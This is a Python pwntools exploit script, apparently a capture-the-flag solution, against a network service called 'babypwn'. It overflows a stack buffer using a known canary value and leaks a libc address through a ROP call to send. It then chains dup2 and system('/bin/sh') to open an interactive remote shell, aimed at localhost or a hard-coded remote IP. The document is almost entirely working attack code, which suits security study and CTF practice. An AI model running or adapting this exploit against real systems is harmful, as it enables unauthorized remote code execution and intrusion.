#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc-2.19.so')
else:
    DEBUG = True
    libc = ELF('libc')

PORT = 8181
b = ELF('babypwn')
context.log_level = 'debug'

###

def menu():
    global r
    r.recvuntil('Select menu > ')

def echo(msg):
    global r
    r.sendline('1')
    r.recvuntil('Message : ')
    r.send(msg)

def exit():
    global r
    r.sendline('3')
    data = r.recvall()
    r.close()
    return data.count('G') > 0

if DEBUG:
    a = 'a'
    SSP = int('0x300f9f00', 16)
else:
    SSP = int('0xea741100', 16)
#SSP = u32(SSP)
log.info("SSP: " + hex(SSP))

r = ''
def leak(addr):
    global r
    global SSP
    global b
    global PORT
    if DEBUG:
        r = remote('localhost', PORT)
    else:
        r = remote('110.10.212.130', 8888) # 8889
    menu()
    ROP  = 'A' * 40
    ROP += p32(SSP)
    ROP += 'B' * 12
    ROP += p32(b.symbols['send'])
    ROP += 'ZZZZ' # bogus ret
    ROP += p32(0x4) # fd
    ROP += p32(addr)
    ROP += p32(4)
    ROP += p32(0)
    echo(ROP)
    menu()
    r.sendline('3')
    data = r.recv(4)
    data = data.ljust(4, '\x00')
    exit()
    r.close()
    return data

#d = DynELF(leak, 0x08048C6B, elf=b)
#libc = d.libc

bla = u32(leak(b.symbols['got.atoi']))
log.info('leak: %#x' % bla)
baselibc = bla - libc.symbols['atoi']
log.info('baselibc: %#x' % baselibc)

if DEBUG:
    r = remote('localhost', PORT)
else:
    r = remote('110.10.212.130', 8888) # 8889

menu()
ROP  = 'A' * 40
ROP += p32(SSP)
ROP += 'B' * 12
ROP += p32(baselibc + libc.symbols['dup2'])
ROP += p32(0x08048b84) # ppr
ROP += p32(4)
ROP += p32(0)
ROP += p32(baselibc + libc.symbols['dup2'])
ROP += p32(0x08048b84) # ppr
ROP += p32(4)
ROP += p32(1)
ROP += p32(b.symbols['system'])
ROP += 'ZZZZ' # bogus ret
ROP += p32(baselibc + list(libc.search("/bin/sh"))[0])
echo(ROP)
menu()
r.sendline('3')
pause()
r.interactive()

